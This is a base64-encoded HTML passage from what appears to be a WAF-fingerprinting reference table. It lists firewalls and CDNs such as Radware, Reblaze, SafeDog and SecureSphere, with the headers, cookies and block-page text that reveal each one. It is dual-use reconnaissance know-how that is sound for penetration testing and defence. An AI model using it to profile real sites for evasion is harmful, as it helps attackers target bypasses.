ICAgICAgPHRkPgogICAgICAgICAgICBwa1NlY3VyaXR5TW9kdWxlIElEUwog
ICAgICAgIDwvdGQ+CiAgICAgICAgPHRkPgogICAgICAgICAgICA8dWw+CiAg
ICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0YWJpbGl0eTogPC9iPk1vZGVy
YXRlPC9saT4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3Rpb24gTWV0
aG9kb2xvZ3k6PC9iPjwvbGk+CiAgICAgICAgICAgICAgICA8dWw+CiAgICAg
ICAgICAgICAgICAgICAgPGxpPlJlc3BvbnNlIGNvbnRlbnQgbWF5IGNvbnRh
aW48L2xpPgogICAgICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAg
ICAgICAgICAgICAgPGxpPjxjb2RlPnBrU2VjdXJpdHlNb2R1bGU6IFNlY3Vy
aXR5LkFsZXJ0PC9jb2RlPi48L2xpPgogICAgICAgICAgICAgICAgICAgICAg
ICA8bGk+PGNvZGU+QSBzYWZldHkgY3JpdGljYWwgcmVxdWVzdCB3YXMgZGlz
Y292ZXJlZCBhbmQgYmxvY2tlZDwvY29kZT4gdGV4dCBzbmlwcGV0LjwvbGk+
CiAgICAgICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgICAgIDwv
dWw+CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+
CiAgICA8dHI+CiAgICAgICAgPHRkPgogICAgICAgICAgICBQb3NpdGl2ZSBU
ZWNobm9sb2dpZXMgQXBwbGljYXRpb24gRmlyZXdhbGwKICAgICAgICA8L3Rk
PgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAg
ICAgPGxpPjxiPkRldGVjdGFiaWxpdHk6IDwvYj5EaWZmaWN1bHQ8L2xpPgog
ICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2RvbG9neTo8
L2I+PC9saT4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAg
ICAgICA8bGk+QmxvY2tlZCByZXNwb25zZSBwYWdlIGNvbnRhaW5zIDxjb2Rl
PkZvcmJpZGRlbjwvY29kZT4gaW4gPGNvZGU+aDE8L2NvZGU+IGZvbGxvd2Vk
IGJ5OjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPlJlcXVl
c3QgSUQ6PC9jb2RlPiBpbiBmb3JtYXQgPGNvZGU+eXl5eS1tbS1kZC1oaC1t
bS1zcy17cmVmLiBjb2RlfTwvY29kZT48L2xpPgogICAgICAgICAgICAgICAg
PC91bD4KICAgICAgICAgICAgPC91bD4KICAgICAgICA8L3RkPgogICAgPC90
cj4KICAgIDx0cj4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIFBvd2VyQ0RO
CiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4K
ICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+TW9k
ZXJhdGU8L2xpPgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGlvbiBN
ZXRob2RvbG9neTo8L2I+PC9saT4KICAgICAgICAgICAgICAgIDx1bD4KICAg
ICAgICAgICAgICAgICAgICA8bGk+UmVzcG9uc2UgaGVhZGVycyBtYXkgY29u
dGFpbjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAg
ICAgICAgICAgICAgICA8bGk+PGNvZGU+VmlhPC9jb2RlPiBoZWFkZXIgd2l0
aCBjb250ZW50IDxjb2RlPnBvd2VyY2RuLmNvbTwvY29kZT4uPC9saT4KICAg
ICAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPlgtQ2FjaGU8L2NvZGU+
IGhlYWRlciB3aXRoIGNvbnRlbnQgPGNvZGU+cG93ZXJjZG4uY29tPC9jb2Rl
Pi48L2xpPgogICAgICAgICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+WC1D
RE48L2NvZGU+IGhlYWRlciB3aXRoIGNvbnRlbnQgPGNvZGU+UG93ZXJDRE48
L2NvZGU+LjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPC91bD4KICAgICAg
ICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgPC90
ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRkPgogICAgICAgICAg
ICBQcm9mZW5zZQogICAgICAgIDwvdGQ+CiAgICAgICAgPHRkPgogICAgICAg
ICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0YWJpbGl0
eTogPC9iPkVhc3k8L2xpPgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVj
dGlvbiBNZXRob2RvbG9neTo8L2I+PC9saT4KICAgICAgICAgICAgICAgIDx1
bD4KICAgICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+U2V0LUNvb2tpZTwv
Y29kZT4gaGVhZGVycyBjb250YWluIDxjb2RlPlBMQlNJRD08L2NvZGU+IGNv
b2tpZSBmaWVsZCBuYW1lLjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxp
Pjxjb2RlPlNlcnZlcjwvY29kZT4gaGVhZGVyIGNvbnRhaW4gPGNvZGU+UHJv
ZmVuc2U8L2NvZGU+IGtleXdvcmQuPC9saT4KICAgICAgICAgICAgICAgIDwv
dWw+CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+
CiAgICA8dHI+CiAgICAgICAgPHRkPgogICAgICAgICAgICBQcm92ZW50aWEg
KElCTSkKICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAg
PHVsPgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGFiaWxpdHk6IDwv
Yj5EaWZmaWN1bHQ8L2xpPgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVj
dGlvbiBNZXRob2RvbG9neTo8L2I+PC9saT4KICAgICAgICAgICAgICAgIDx1
bD4KICAgICAgICAgICAgICAgICAgICA8bGk+QmxvY2tlZCByZXNwb25zZSBw
YWdlIG1pZ2h0IGNvbnRhaW4gdG8gPGNvZGU+cmVxdWVzdCBkb2VzIG5vdCBt
YXRjaCBQcm92ZW50aWEgcnVsZXM8L2NvZGU+IHRleHQgc25pcHBldC48L2xp
PgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPC91bD4KICAg
ICAgICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8dGQ+CiAg
ICAgICAgICAgIFB1aHVpCiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAg
ICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3Rh
YmlsaXR5OiA8L2I+RWFzeTwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+
RGV0ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAgICAg
ICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT48Y29kZT5TZXJ2ZXI8
L2NvZGU+IGhlYWRlciBjb250YWluIDxjb2RlPlB1aHVpV0FGPC9jb2RlPiBr
ZXl3b3JkLjwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAg
ICA8L3VsPgogICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAg
ICAgIDx0ZD4KICAgICAgICAgICAgUWluaXUgQ0ROCiAgICAgICAgPC90ZD4K
ICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAg
IDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+RWFzeTwvbGk+CiAgICAgICAg
ICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xp
PgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxs
aT5SZXNwb25zZSBjb250ZW50IG1heSBjb250YWluPC9saT4KICAgICAgICAg
ICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsaT5S
ZXNwb25zZSBoZWFkZXJzIGNvbnRhaW4gdW51c3VhbCBoZWFkZXIgPGNvZGU+
WC1RaW5pdS1DRE48L2NvZGU+IHdpdGggdmFsdWUgc2V0IHRvIGVpdGhlciA8
Y29kZT4wPC9jb2RlPiBvciA8Y29kZT4xPC9jb2RlPi48L2xpPgogICAgICAg
ICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgICAgICA8L3VsPgogICAg
ICAgICAgICA8L3VsPgogICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAgPHRy
PgogICAgICAgIDx0ZD4KICAgICAgICAgICAgUmFkd2FyZSBBcHB3YWxsCiAg
ICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAg
ICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+TW9kZXJh
dGU8L2xpPgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGlvbiBNZXRo
b2RvbG9neTo8L2I+PC9saT4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAg
ICAgICAgICAgICAgICA8bGk+UmVzcG9uc2UgcGFnZSBjb250YWlucyB0aGUg
Zm9sbG93aW5nIHRleHQgc25pcHBldDo8YnI+IDxjb2RlPlVuYXV0aG9yaXpl
ZCBBY3Rpdml0eSBIYXMgQmVlbiBEZXRlY3RlZC48L2NvZGU+IGFuZCA8Y29k
ZT5DYXNlIE51bWJlcjwvY29kZT48L2xpPgogICAgICAgICAgICAgICAgICAg
IDxsaT5CbG9ja2VkIHJlc3BvbnNlIHBhZ2UgaGFzIHJlZmVyZW5jZSB0byA8
Y29kZT5yYWR3YXJlYWxlcnRpbmdAe3NpdGUudGxkfTwvY29kZT4gZW1haWwu
PC9saT4KICAgICAgICAgICAgICAgICAgICA8bGk+QmxvY2tlZCByZXNwb25z
ZSBwYWdlIGhhcyB0aXRsZSBzZXQgdG8gPGNvZGU+VW5hdXRob3JpemVkIFJl
cXVlc3QgQmxvY2tlZDwvY29kZT4uPC9saT4KICAgICAgICAgICAgICAgICAg
ICA8bGk+UmVzcG9uc2UgaGVhZGVycyBtYXkgY29udGFpbiA8Y29kZT5YLVNM
LUNvbXBTdGF0ZTwvY29kZT4gaGVhZGVyIGZpZWxkIG5hbWUuPC9saT4KICAg
ICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAg
PC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRkPgogICAgICAg
ICAgICBSZWJsYXplCiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAg
ICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmls
aXR5OiA8L2I+TW9kZXJhdGU8L2xpPgogICAgICAgICAgICAgICAgPGxpPjxi
PkRldGVjdGlvbiBNZXRob2RvbG9neTo8L2I+PC9saT4KICAgICAgICAgICAg
ICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+Q29va2llcyBpbiBy
ZXNwb25zZSBoZWFkZXJzIGNvbnRhaW4gPGNvZGU+cmJ6aWQ9PC9jb2RlPiBo
ZWFkZXIgZmllbGQgbmFtZS48L2xpPgogICAgICAgICAgICAgICAgICAgIDxs
aT48Y29kZT5TZXJ2ZXI8L2NvZGU+IGZpZWxkIHZhbHVlIG1pZ2h0IGNvbnRh
aW4gPGNvZGU+UmVibGF6ZSBTZWN1cmUgV2ViIEdhdGV3YXk8L2NvZGU+IHRl
eHQgc25pcHBldC48L2xpPgogICAgICAgICAgICAgICAgICAgIDxsaT5SZXNw
b25zZSBwYWdlIGNvbnRhaW5zOjwvbGk+CiAgICAgICAgICAgICAgICAgICAg
PHVsPgogICAgICAgICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+QWNjZXNz
IERlbmllZCAoNDAzKTwvY29kZT4gaW4gYm9sZC48L2xpPgogICAgICAgICAg
ICAgICAgICAgICAgICA8bGk+PGNvZGU+Q3VycmVudCBzZXNzaW9uIGhhcyBi
ZWVuIHRlcm1pbmF0ZWQ8L2NvZGU+IHRleHQuPC9saT4KICAgICAgICAgICAg
ICAgICAgICAgICAgPGxpPjxjb2RlPkZvciBmdXJ0aGVyIGluZm9ybWF0aW9u
LCBkbyBub3QgaGVzaXRhdGUgdG8gY29udGFjdCB1czwvY29kZT4uPC9saT4K
ICAgICAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgPC91
bD4KICAgICAgICAgICAgPC91bD4KICAgICAgICA8L3RkPgogICAgPC90cj4K
ICAgIDx0cj4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIFJlcXVlc3QgVmFs
aWRhdGlvbiBNb2RlCiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAg
ICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmls
aXR5OiA8L2I+RWFzeTwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0
ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAg
PHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT5BIGZpcmV3YWxsIGZvdW5k
IHNwZWNpZmljYWxseSBvbiBBU1AuTkVUIHdlYnNpdGVzIGFuZCBub25lIG90
aGVycy48L2xpPgogICAgICAgICAgICAgICAgICAgIDxsaT5SZXNwb25zZSBw
YWdlIGNvbnRhaW5zIGVpdGhlciBvZiB0aGUgZm9sbG93aW5nIHRleHQgc25p
cHBldDo8L2xpPgogICAgICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAg
ICAgICAgICAgICAgICAgPGxpPjxjb2RlPkFTUC5ORVQgaGFzIGRldGVjdGVk
IGRhdGEgaW4gdGhlIHJlcXVlc3QgdGhhdCBpcyBwb3RlbnRpYWxseSBkYW5n
ZXJvdXMuPC9jb2RlPjwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxs
aT48Y29kZT5SZXF1ZXN0IFZhbGlkYXRpb24gaGFzIGRldGVjdGVkIGEgcG90
ZW50aWFsbHkgZGFuZ2Vyb3VzIGNsaWVudCBpbnB1dCB2YWx1ZS48L2NvZGU+
PC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPkh0dHBS
ZXF1ZXN0VmFsaWRhdGlvbkV4Y2VwdGlvbi48L2NvZGU+PC9saT4KICAgICAg
ICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgICAgIDxsaT5C
bG9ja2VkIHJlc3BvbnNlIGNvZGUgcmV0dXJuZWQgaXMgYWx3YXlzIDxjb2Rl
PjUwMCBJbnRlcm5hbCBFcnJvcjwvY29kZT4uPC9saT4KICAgICAgICAgICAg
ICAgIDwvdWw+CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgPC90ZD4KICAg
IDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRkPgogICAgICAgICAgICBSU0Zp
cmV3YWxsCiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAg
IDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8
L2I+RWFzeTwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9u
IE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgog
ICAgICAgICAgICAgICAgICAgIDxsaT5SZXNwb25zZSBwYWdlIGNvbnRhaW5z
OjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAg
ICAgICAgICAgICA8bGk+PGNvZGU+Q09NX1JTRklSRVdBTExfNDAzX0ZPUkJJ
RERFTjwvY29kZT4ga2V5d29yZC48L2xpPgogICAgICAgICAgICAgICAgICAg
ICAgICA8bGk+PGNvZGU+Q09NX1JTRklSRVdBTExfRVZFTlQ8L2NvZGU+IGtl
eXdvcmQuPC9saT4KICAgICAgICAgICAgICAgICAgICA8L3VsPgogICAgICAg
ICAgICAgICAgPC91bD4KICAgICAgICAgICAgPC91bD4KICAgICAgICA8L3Rk
PgogICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8dGQ+CiAgICAgICAgICAg
IFNhYnJlCiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAg
IDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8
L2I+RWFzeTwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9u
IE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgog
ICAgICAgICAgICAgICAgICAgIDxsaT5SZXR1cm5zIHN0YXR1cyBjb2RlIDxj
b2RlPjUwMCBJbnRlcm5hbCBFcnJvcjwvY29kZT4gdXBvbiBtYWxpY2lvdXMg
cmVxdWVzdHMuPC9saT4KICAgICAgICAgICAgICAgICAgICA8bGk+UmVzcG9u
c2UgY29udGVudCBoYXM6CiAgICAgICAgICAgICAgICAgICAgICAgIDx1bD4K
ICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsaT5Db250YWN0IGVtYWls
IDxjb2RlPmR4c3VwcG9ydEBzYWJyZS5jb208L2NvZGU+LjwvbGk+CiAgICAg
ICAgICAgICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+WW91ciByZXF1ZXN0
IGhhcyBiZWVuIGJsb2NrZWQ8L2NvZGU+IGJvbGQgd2FybmluZy48L2xpPgog
ICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPmNsaWNraW5n
IHRoZSBhYm92ZSBlbWFpbCBsaW5rIHdpbGwgYXV0b21hdGljYWxseSBhZGQg
c29tZSBpbXBvcnRhbnQgZGV0YWlscyB0byB0aGUgZW1haWwgZm9yIHVzIHRv
IGludmVzdGlnYXRlIHRoZSBwcm9ibGVtPC9jb2RlPiB0ZXh0IHNuaXBwZXQu
PC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAg
ICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAg
ICAgICAgPC91bD4KICAgICAgICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4K
ICAgICAgICA8dGQ+CiAgICAgICAgICAgIFNhZmUzCiAgICAgICAgPC90ZD4K
ICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAg
IDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+RWFzeTwvbGk+CiAgICAgICAg
ICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xp
PgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxs
aT5SZXNwb25zZSBoZWFkZXJzIGNvbnRhaW46PC9saT4KICAgICAgICAgICAg
ICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsaT48Y29k
ZT5YLVBvd2VyZWQtQnk8L2NvZGU+IGhlYWRlciBoYXMgZmllbGQgdmFsdWUg
PGNvZGU+U2FmZTNXQUY8L2NvZGU+LjwvbGk+CiAgICAgICAgICAgICAgICAg
ICAgICAgIDxsaT48Y29kZT5TZXJ2ZXI8L2NvZGU+IGhlYWRlciBjb250YWlu
cyBmaWVsZCB2YWx1ZSBzZXQgdG8gPGNvZGU+U2FmZTMgV2ViIEZpcmV3YWxs
PC9jb2RlPi48L2xpPgogICAgICAgICAgICAgICAgICAgIDwvdWw+CiAgICAg
ICAgICAgICAgICAgICAgPGxpPlJlc3BvbnNlIHBhZ2UgY29udGFpbnMgPGNv
ZGU+U2FmZTN3YWY8L2NvZGU+IGtleXdvcmQuPC9saT4KICAgICAgICAgICAg
ICAgIDwvdWw+CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgPC90ZD4KICAg
IDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRkPgogICAgICAgICAgICBTYWZl
RG9nCiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1
bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+
RWFzeS9Nb2RlcmF0ZTwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0
ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAg
PHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT48Y29kZT5TZXJ2ZXI8L2Nv
ZGU+IGhlYWRlciBpbiByZXNwb25zZSBtYXkgY29udGFpbjo8L2xpPgogICAg
ICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICAgICAg
PGxpPjxjb2RlPldBRi8yLjA8L2NvZGU+IGtleXdvcmQuPC9saT4KICAgICAg
ICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPnNhZmVkb2c8L2NvZGU+IGZp
ZWxkIHZhbHVlLjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPC91bD4KICAg
ICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAg
PC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRkPgogICAgICAg
ICAgICBTZWNLaW5nCiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAg
ICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmls
aXR5OiA8L2I+RWFzeS9Nb2RlcmF0ZTwvbGk+CiAgICAgICAgICAgICAgICA8
bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAg
ICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT48Y29kZT5T
ZXJ2ZXI8L2NvZGU+IGhlYWRlciBpbiByZXNwb25zZSBtYXkgY29udGFpbjo8
L2xpPgogICAgICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAg
ICAgICAgICAgPGxpPjxjb2RlPlNFQ0tJTkdXQUY8L2NvZGU+IGtleXdvcmQu
PC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPlNFQ0tJ
Tkcve3ZlcnNpb259PC9jb2RlPiBmaWVsZCB2YWx1ZS48L2xpPgogICAgICAg
ICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgICAgICA8L3VsPgogICAg
ICAgICAgICA8L3VsPgogICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAgPHRy
PgogICAgICAgIDx0ZD4KICAgICAgICAgICAgU2VjdVByZXNzCiAgICAgICAg
PC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAg
ICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+RWFzeTwvbGk+CiAg
ICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5Ojwv
Yj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAg
ICAgIDxsaT5SZXNwb25zZSBjb250ZW50IG1heSBjb250YWluOjwvbGk+CiAg
ICAgICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgICAg
ICA8bGk+PGNvZGU+U2VjdVByZXNzPC9jb2RlPiBhcyB0ZXh0LjwvbGk+CiAg
ICAgICAgICAgICAgICAgICAgICAgIDxsaT48Y29kZT5CbG9jayBJRDogQmFk
IFVSTCBDb250ZW50czwvY29kZT4gYXMgdGV4dC48L2xpPgogICAgICAgICAg
ICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgICAgICAgICAgPGxpPlJlc3Bv
bnNlIGNvZGUgcmV0dXJuZWQgaXMgPGNvZGU+NTAzIFNlcnZpY2UgVW5hdmFp
bGFibGU8L2NvZGU+LjwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAg
ICAgICAgICA8L3VsPgogICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAgPHRy
PgogICAgICAgIDx0ZD4KICAgICAgICAgICAgU2VjdXJlIEVudHJ5CiAgICAg
ICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAg
ICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+RWFzeTwvbGk+
CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5
OjwvYj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAg
ICAgICAgIDxsaT48Y29kZT5TZXJ2ZXI8L2NvZGU+IGhlYWRlciBjb250YWlu
cyB2YWx1ZSBzZXQgdG8gPGNvZGU+U2VjdXJlIEVudHJ5IFNlcnZlcjwvY29k
ZT4uPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwv
dWw+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAg
PHRkPgogICAgICAgICAgICBTZWN1cmVJSVMKICAgICAgICA8L3RkPgogICAg
ICAgIDx0ZD4KICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgPGxp
PjxiPkRldGVjdGFiaWxpdHk6IDwvYj5FYXN5PC9saT4KICAgICAgICAgICAg
ICAgIDxsaT48Yj5EZXRlY3Rpb24gTWV0aG9kb2xvZ3k6PC9iPjwvbGk+CiAg
ICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAgPGxpPlJl
c3BvbnNlIHBhZ2UgY29udGFpbnMgZWl0aGVyIG9mIHRoZSBmb2xsb3dpbmcg
dGV4dCBzbmlwcGV0OjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPHVsPgog
ICAgICAgICAgICAgICAgICAgICAgICA8bGk+SW1hZ2UgZGlzcGxheWluZyA8
Y29kZT5iZXlvbmR0cnVzdDwvY29kZT4gbG9nby48L2xpPgogICAgICAgICAg
ICAgICAgICAgICAgICA8bGk+PGNvZGU+RG93bmxvYWQgU2VjdXJlSUlTIFBl
cnNvbmFsIEVkaXRpb248L2NvZGU+PC9saT4KICAgICAgICAgICAgICAgICAg
ICAgICAgPGxpPlJlZmVyZW5jZSB0byA8Y29kZT5odHRwOi8vd3d3LmVleWUu
Y29tL1NlY3VyZUlJUy88L2NvZGU+IFVSTC48L2xpPgogICAgICAgICAgICAg
ICAgICAgICAgICA8bGk+PGNvZGU+U2VjdXJlSUlTIEVycm9yPC9jb2RlPiB0
ZXh0IHNuaXBwZXQuPC9saT4KICAgICAgICAgICAgICAgICAgICA8L3VsPgog
ICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPC91bD4KICAgICAg
ICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8dGQ+CiAgICAg
ICAgICAgIFNlY3VyZVNwaGVyZQogICAgICAgIDwvdGQ+CiAgICAgICAgPHRk
PgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0
ZWN0YWJpbGl0eTogPC9iPkRpZmZpY3VsdDwvbGk+CiAgICAgICAgICAgICAg
ICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAg
ICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT5SZXNw
b25zZSBwYWdlIGNvbnRhaW5zIHRoZSBmb2xsb3dpbmcgdGV4dCBzbmlwcGV0
OjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAg
ICAgICAgICAgICA8bGk+RXJyb3IgaW4gPGNvZGU+aDI8L2NvZGU+IHRleHQu
PC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgPGxpPlRpdGxlIGNvbnRh
aW5zIG9ubHkgdGV4dCBhcyA8Y29kZT5FcnJvcjwvY29kZT4uPC9saT4KICAg
ICAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPkNvbnRhY3Qgc3VwcG9y
dCBmb3IgYWRkaXRpb25hbCBpbmZvcm1hdGlvbi48L2NvZGU+IHRleHQuPC9s
aT4KICAgICAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAg
PC91bD4KICAgICAgICAgICAgPC91bD4KICAgICAgICA8L3RkPgogICAgPC90
cj4KICAgIDx0cj4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIFNFbmdpbngK
ICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPHVsPgog
ICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGFiaWxpdHk6IDwvYj5FYXN5
PC9saT4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3Rpb24gTWV0aG9k
b2xvZ3k6PC9iPjwvbGk+CiAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAg
ICAgICAgICAgICAgPGxpPkJsb2NrZWQgcmVzcG9uc2UgcGFnZSBjb250YWlu
cyA8Y29kZT5TRU5HSU5YLVJPQk9ULU1JVElHQVRJT048L2NvZGU+IGtleXdv
cmQuPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwv
